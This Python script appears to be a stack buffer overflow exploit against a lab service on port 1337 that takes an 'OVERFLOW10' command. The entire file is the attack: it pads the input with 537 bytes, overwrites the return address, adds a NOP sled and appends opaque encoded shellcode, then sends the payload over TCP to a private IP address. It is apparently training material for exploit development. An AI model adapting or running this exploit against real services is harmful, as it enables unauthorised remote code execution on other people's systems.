import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 1337		# Change this

buffer = b'OVERFLOW10 '
buffer += b'A' * 537
retn = b'\xaf\x11\x50\x62'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\x2b\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\xdb\xf4\xce\x4f\x83\xee\xfc"
shellcode += b"\xe2\xf4\x27\x1c\x4c\x4f\xdb\xf4\xae\xc6\x3e"
shellcode += b"\xc5\x0e\x2b\x50\xa4\xfe\xc4\x89\xf8\x45\x1d"
shellcode += b"\xcf\x7f\xbc\x67\xd4\x43\x84\x69\xea\x0b\x62"
shellcode += b"\x73\xba\x88\xcc\x63\xfb\x35\x01\x42\xda\x33"
shellcode += b"\x2c\xbd\x89\xa3\x45\x1d\xcb\x7f\x84\x73\x50"
shellcode += b"\xb8\xdf\x37\x38\xbc\xcf\x9e\x8a\x7f\x97\x6f"
shellcode += b"\xda\x27\x45\x06\xc3\x17\xf4\x06\x50\xc0\x45"
shellcode += b"\x4e\x0d\xc5\x31\xe3\x1a\x3b\xc3\x4e\x1c\xcc"
shellcode += b"\x2e\x3a\x2d\xf7\xb3\xb7\xe0\x89\xea\x3a\x3f"
shellcode += b"\xac\x45\x17\xff\xf5\x1d\x29\x50\xf8\x85\xc4"
shellcode += b"\x83\xe8\xcf\x9c\x50\xf0\x45\x4e\x0b\x7d\x8a"
shellcode += b"\x6b\xff\xaf\x95\x2e\x82\xae\x9f\xb0\x3b\xab"
shellcode += b"\x91\x15\x50\xe6\x25\xc2\x86\x9e\xcf\xc2\x5e"
shellcode += b"\x46\xce\x4f\xdb\xa4\xa6\x7e\x50\x9b\x49\xb0"
shellcode += b"\x0e\x4f\x2e\x52\xf1\xfe\xa6\xe9\x4e\x49\x53"
shellcode += b"\xb0\x0e\xc8\xc8\x33\xd1\x74\x35\xaf\xae\xf1"
shellcode += b"\x75\x08\xc8\x86\xa1\x25\xdb\xa7\x31\x9a\xb8"
shellcode += b"\x95\xa2\x2c\xf5\x91\xb6\x2a\xdb\xf4\xce\x4f"







payload = buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)